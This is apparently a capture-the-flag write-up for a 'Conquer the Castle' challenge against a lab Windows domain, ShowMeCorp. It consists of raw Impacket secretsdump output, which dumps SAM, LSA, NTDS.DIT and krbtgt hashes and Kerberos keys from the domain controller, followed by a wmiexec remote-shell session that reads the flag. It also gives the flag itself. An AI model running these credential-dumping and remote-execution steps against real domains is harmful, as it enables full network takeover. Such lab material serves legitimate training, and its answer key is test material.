# Conquer the Castle

## Points 500

Your target is pretty straightforward. Just a file on the Desktop.

Well - it would be simple if the domain controller would let you in.

This is the final challenge of ShowMeCorp.

Report your victory to the admins via Slack - first to conquer this challenge wins an award with 200 bonus points.

(There is a flag.txt file you must retrieve)

(This target will reset every 60 minutes, at the start of the hour)

(Message the Support Slack and if we validate you accomplished this first, you will receive an additional 200 points) --- Already Completed


## Answer

flag-f6830eaf5d053a79fd2c5e7d1cdc14b0

```
root@kali:~# secretsdump.py SHOWMECORP/susan.stone.adm@10.110.25.5
Impacket v0.9.18-dev - Copyright 2002-2018 Core Security Technologies

Password:
[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0xdaede84ffde6b7a334795b9fdc00adcf
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:a0615edfc5fdbf3b57378983b2980893:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
SHOWMECORP\SHOWMECORP-DC01$:aad3b435b51404eeaad3b435b51404ee:4966eb98c367dec6bee211a1a739101a:::
[*] DPAPI_SYSTEM 
 0000   01 00 00 00 6B 73 5E 11  29 DA 21 82 9D AB 44 8A   ....ks^.).!...D.
 0010   23 48 4E 17 F8 0F B8 47  AE 09 02 6E 85 95 6B 59   #HN....G...n..kY
 0020   A8 AC F5 18 5A A8 72 15  82 6C DD C9               ....Z.r..l..
DPAPI_SYSTEM:010000006b735e1129da21829dab448a23484e17f80fb847ae09026e85956b59a8acf5185aa87215826cddc9
[*] NL$KM 
 0000   36 CD 10 73 23 46 35 06  F5 F6 EE 92 E2 70 EE 2B   6..s#F5......p.+
 0010   1F 8B 44 19 4C A3 1F A6  BA 52 68 D2 FB 3C B7 92   ..D.L....Rh..<..
 0020   29 DA 87 1D C4 D9 28 65  DD 6C 76 76 80 F6 C3 28   ).....(e.lvv...(
 0030   D5 CD A3 AD 15 D5 55 F9  29 08 1D 2F F7 C5 CA C3   ......U.)../....
NL$KM:36cd107323463506f5f6ee92e270ee2b1f8b44194ca31fa6ba5268d2fb3cb79229da871dc4d92865dd6c767680f6c328d5cda3ad15d555f929081d2ff7c5cac3
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:c8353ba002b923dbe66cd711deff0e06:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:3ec77d956b57b403b3e0be063c5a3751:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
showmecorp.local\berk.mikely:1106:aad3b435b51404eeaad3b435b51404ee:41fd5d1c137db58c21e5a86876459c12:::
showmecorp.local\susan.stone:1107:aad3b435b51404eeaad3b435b51404ee:302e873972d05498751d78bed44e7b92:::
showmecorp.local\susan.stone.adm:1108:aad3b435b51404eeaad3b435b51404ee:6b126aa4b3e76b07bf53ab13c9b28349:::
SHOWMECORP-DC01$:1000:aad3b435b51404eeaad3b435b51404ee:4966eb98c367dec6bee211a1a739101a:::
SHOWMECORP-01$:1103:aad3b435b51404eeaad3b435b51404ee:80809bb9fd76d7b27e739673417ca0d0:::
SHOWMECORP-02$:1104:aad3b435b51404eeaad3b435b51404ee:c35fc24637d5ff2cd6c333ddaaf0a23c:::
SHOWMECORP-02A$:3601:aad3b435b51404eeaad3b435b51404ee:ba63b0a06bc183d55e07ea6875233974:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:cba780ffa814c3ffedfb98b2a68d079447d2c6a55aa652f52ead122493c880c6
Administrator:aes128-cts-hmac-sha1-96:feb043926957392ca461e73340b51188
Administrator:des-cbc-md5:94080b2c20946861
krbtgt:aes256-cts-hmac-sha1-96:273ee2d8e9ee78bce3190abdbc74bf5a8693beaba37be7e2b57f1cc81f2abf42
krbtgt:aes128-cts-hmac-sha1-96:be5f552617f45968632aa828776b93f2
krbtgt:des-cbc-md5:2658ad3e4c70a443
showmecorp.local\berk.mikely:aes256-cts-hmac-sha1-96:0e237ab896461f1a40c91cbb2862b22017c36a82641e39c9545c6654c4f51e1c
showmecorp.local\berk.mikely:aes128-cts-hmac-sha1-96:59c5ba611073c6e3dee98e4d9d8252f6
showmecorp.local\berk.mikely:des-cbc-md5:51a845c48c67e0ae
showmecorp.local\susan.stone:aes256-cts-hmac-sha1-96:2744ea6b88b6ded022b80da233b873f8dad7c482a4da644888af21bd80989c50
showmecorp.local\susan.stone:aes128-cts-hmac-sha1-96:cace42a0b2e68e1183595f0c6e211662
showmecorp.local\susan.stone:des-cbc-md5:dfadad764623701a
showmecorp.local\susan.stone.adm:aes256-cts-hmac-sha1-96:37ec0b7178213b2c8b1ace59e70fee909fd603e45a332b951b77d290eab05371
showmecorp.local\susan.stone.adm:aes128-cts-hmac-sha1-96:425bea61499ae334746d738f3dc0e1d0
showmecorp.local\susan.stone.adm:des-cbc-md5:7951d55b19ce10e0
SHOWMECORP-DC01$:aes256-cts-hmac-sha1-96:374e8666de86948a28f237cb1b2c7d195d8e995c7a337c75e27feabfa3a27929
SHOWMECORP-DC01$:aes128-cts-hmac-sha1-96:6edeb3b8e266cb6a9e70fbe5f9573974
SHOWMECORP-DC01$:des-cbc-md5:3bd9ef404c7c16d6
SHOWMECORP-01$:aes256-cts-hmac-sha1-96:9b73261c8ab400f739e17bb06426ce2ca63fc6b432f0144be5ead5de7b23beba
SHOWMECORP-01$:aes128-cts-hmac-sha1-96:3692454a0797ea9c03ae7cd051da746c
SHOWMECORP-01$:des-cbc-md5:3d837064d96173ba
SHOWMECORP-02$:aes256-cts-hmac-sha1-96:5b59b18b92b2a4010c363a10e0f9bd1beabbfa2edc20f75d9c8c3559cb195a9a
SHOWMECORP-02$:aes128-cts-hmac-sha1-96:ddb53ac1025dbe29d972588580bf3c77
SHOWMECORP-02$:des-cbc-md5:abb56e5db0315e2f
SHOWMECORP-02A$:aes256-cts-hmac-sha1-96:f7aa3f2c681aa9573a80cd6934bd1ee739ffae3471078ec7b1d8353d60863b67
SHOWMECORP-02A$:aes128-cts-hmac-sha1-96:6491255f14359932728b741c2aded7f8
SHOWMECORP-02A$:des-cbc-md5:4580c8c24c9b258f
[*] Cleaning up... 
[*] Stopping service RemoteRegistry
[-] SCMR SessionError: code: 0x41b - ERROR_DEPENDENT_SERVICES_RUNNING - A stop control has been sent to a service that other running services are dependent on.
[*] Cleaning up... 
[*] Stopping service RemoteRegistry
```


```
root@kali:~# wmiexec.py SHOWMECORP/susan.stone.adm@10.110.25.5
Impacket v0.9.18-dev - Copyright 2002-2018 Core Security Technologies

Password:
[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>dir
 Volume in drive C has no label.
 Volume Serial Number is DE53-914E

 Directory of C:\

09/20/2018  11:22 AM    <DIR>          PerfLogs
09/20/2018  12:06 PM    <DIR>          Program Files
07/16/2016  08:23 AM    <DIR>          Program Files (x86)
09/19/2018  02:48 PM    <DIR>          Users
10/21/2018  12:12 AM    <DIR>          Windows
               0 File(s)              0 bytes
               5 Dir(s)  85,318,168,576 bytes free

C:\>cd Users
C:\Users>cd Administrator
C:\Users\Administrator>cd Desktop
C:\Users\Administrator\Desktop>dir
 Volume in drive C has no label.
 Volume Serial Number is DE53-914E

 Directory of C:\Users\Administrator\Desktop

09/24/2018  11:05 AM    <DIR>          .
09/24/2018  11:05 AM    <DIR>          ..
09/24/2018  11:05 AM                37 flag.txt.txt
               1 File(s)             37 bytes
               2 Dir(s)  85,318,103,040 bytes free

C:\Users\Administrator\Desktop>type flag.txt.txt
flag-f6830eaf5d053a79fd2c5e7d1cdc14b0
C:\Users\Administrator\Desktop>

```